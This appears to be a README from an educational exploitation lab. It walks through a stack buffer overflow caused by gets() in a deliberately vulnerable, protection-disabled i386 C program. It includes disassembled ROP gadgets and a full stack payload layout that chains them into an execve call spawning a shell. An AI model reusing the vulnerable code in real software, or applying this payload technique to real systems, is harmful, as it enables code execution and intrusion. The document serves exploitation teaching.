# Stack Overflow using the gets() function
<p align="justify">
The main idea of this proof of concept is to show how something that may seem so harmless can result in taking full controll of the program flow. An insecure function like gets() opens the door to a Stack Buffer Overflow attack.
</p>

## Code and Compilation
Program's code is the following:
```
#include <stdio.h>

void vuln(){
   char buffer[32];
   gets(buffer);
}

int main(){
   puts("Inicio");
   vuln();
   return 0;
}
```
<p align="justify">
In order to make the attack replicable, we have to add certain flags when compiling. We are going to use the cross-compiler that generates full i386 code. Its setup is explained at the <a href ="https://github.com/miguelgonpam/VM-i386-32bit">root's README.md</a>
</p>

We must use the following flags:
```
./gcc-i386 -o program program.c -fomit-frame-pointer -fno-stack-protection -no-pie -static
```
`-no-pie` and `-static` were explained on the <a href ="https://github.com/miguelgonpam/VM-i386-32bit">root's README.md</a> but there are new ones:
- `-fomit-frame-pointer` avoids pushing old frame pointer and creating a new one at the beggining of every function and the same at the end (destroying frame and popping old one).
- `-fno-stack-protector` avoids compiling with the [SSP](https://en.wikipedia.org/wiki/Buffer_overflow_protection) technique, so the overflow can be performed.

## Vulnerability
<p align="justify">
This programs contains a Stack Buffer Overflow (<a href="https://cwe.mitre.org/data/definitions/121.html">CWE-121</a>), that allows to write on the buffer (which is a local variable so it resides on the stack) beyond the expected size. Writing further than the compiler expects, results in the ability of overwriting the return address value and pretty much all the values on the stack that we want.
Then we can choose which addresses we want to replace or overwrite, so we can jump to any instruction we want (or either our own instructions on the stack if NX is off). This technique is called <a href="https://en.wikipedia.org/wiki/Return-to-libc_attack">Ret2Libc</a>.
The ending of pretty much all the functions contains some POP instructions and then the RET. We control which values are allocated on the stack so we also can controll the values in the registers.
</p>

We must use a disassembly tool like `objdump` to see which instructions or addresses could be interesting jumping to. 

Once that we have all the instructions needed, we fill the stack with their addresses, and wait for the fun to begin.

## Objective
Our goal is to perform a syscall. We are going to execute an execve that is going to give us a shell. 
Before that, we need to load onto the EAX register the execve syscall number (11). And then we have to load on the rest of registers the arguments to perform such syscall.
According to `man 2 execve` it expects 3 arguments:
```
 int execve(const char *pathname, char *const _Nullable argv[], char *const _Nullable envp[]);
```
At first it is a little difficult to understand:
- First argument must be a pointer to a String, cointaining the pathname of the file to execute.
- Second argument must be a pointer to string pointers array, containing the arguments.
- Third argument must be a pointer to string pointers, containing the environment variables.

An useful execve would be (replacing `/dev/pts/0` with the result of executing `tty` command on our terminal):
```
execve("/bin/bash", ["/bin/bash", "-c", " < /dev/pts/0"], [])
```





## Exploitation
<details>
  <summary>Click here to see the solution</summary>



  We have found the following utils. (Addresses can change if the program is compiled again)

  A "POP eax" can be difficult to find, so we are going to use this. Moves into the EAX the next value at the top of the stack value.
```
 80489a1:       8b 44 24 04             mov    eax,DWORD PTR [esp+0x4]
 80489a5:       c3                      ret
```
  Then, we have to load the rest of registers. We are going to use this:
```
 8048d8f:       8b 54 24 24             mov    edx,DWORD PTR [esp+0x24]
 8048d93:       8b 4c 24 28             mov    ecx,DWORD PTR [esp+0x28]
 8048d97:       8d 74 24 08             lea    esi,[esp+0x8]
 8048d9b:       8b 5c 24 20             mov    ebx,DWORD PTR [esp+0x20]
 8048d9f:       8b 7c 24 2c             mov    edi,DWORD PTR [esp+0x2c]
 8048da3:       65 ff 15 10 00 00 00    call   DWORD PTR gs:0x10
```
This loads all the registers with values from the stack. We control the stack so we can get the registers to have the values we want. Even though ESI and EDI are affected, we are interested only in EBX, ECX and EDX.
Also, `CALL gs:0x10` calls to `INT 0x80`, which performs the syscall. We have the full set now.

Now that we have the utils, we must execute the program with the emulator (use interface mode) and see where the buffer begins (If the string typed begins with "AAAA", it will result on `0x41414141` on the stack), and that is the buffer start.
Buffer grows to greater addresses, so we must spot where the return address is. They usualy are `0x804xxxxx`. Thats where our first util must be, so create a payload that has padding until it reaches that address, and then just chain the utils.

The payload should make the stack look something like this:
```
LOWER ADDRESSES

0x6e69622f #buffer start "/bin"
0x7361622f #             "/bas"
0x632d0068 #             "h\0-c"
0x69622f00 #             "\0/bin"
0x61622f6e #             "n/ba"
0x3c206873 #             "sh <"
0x65642f20 #             " /de"
0x74702f76 #             "v/pt"
0x00302f73 #             "s/0\0"
0x00000000 # padding
0xa1890408 # mov    eax,DWORD PTR [esp+0x4]; ret  (overwritten return address)
0x8f8d0408 # mov    edx,DWORD PTR [esp+0x24];......; ret
0x0b000000 # 11 (this value ends up in EAX so syscall is execve)
0x00000000 #                              (esp +0x4)
0x00000000 # value to mov into esi        (esp +0x8)
0xe0f0efff # execve argv[0]               (esp +0xc)
0xeaf0efff # argv[1]                      (esp +0x10)
0xedf0efff #                              (esp +0x14)
0x00000000 #                              (esp +0x18)
0x00000000 #                              (esp +0x1c)
0xe0f0efff # value to mov into ebx        (esp +0x20)
0x00000000 # value to mov into edx        (esp +0x24)
0x20f1efff # value to mov into ecx        (esp +0x28)
0x00000000 # value to mov into edi        (esp +0x2c)

HIGHER ADDRESSES
```

Full exploit available at `payload.py`

</details>

